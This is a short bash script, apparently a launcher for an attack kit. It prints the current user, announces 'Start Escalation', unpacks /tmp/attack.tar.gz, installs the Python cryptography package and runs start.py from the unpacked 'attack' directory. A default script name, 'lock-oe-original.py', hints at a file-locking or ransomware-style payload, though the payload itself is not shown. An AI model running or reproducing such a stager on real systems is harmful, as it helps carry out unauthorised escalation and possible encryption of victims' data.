#!/bin/bash
echo "=========== Cat User: =========="
whoami
echo "========== End ==========="

echo "===== Start Escalation =========="
script_name="${1:-lock-oe-original.py}"  # default to original script if none provided
cd /tmp && tar -xzvf /tmp/attack.tar.gz && pip3 install cryptography && cd attack && python3 start.py

#cd /tmp/attack && pip3 install cryptography && python3 start.py
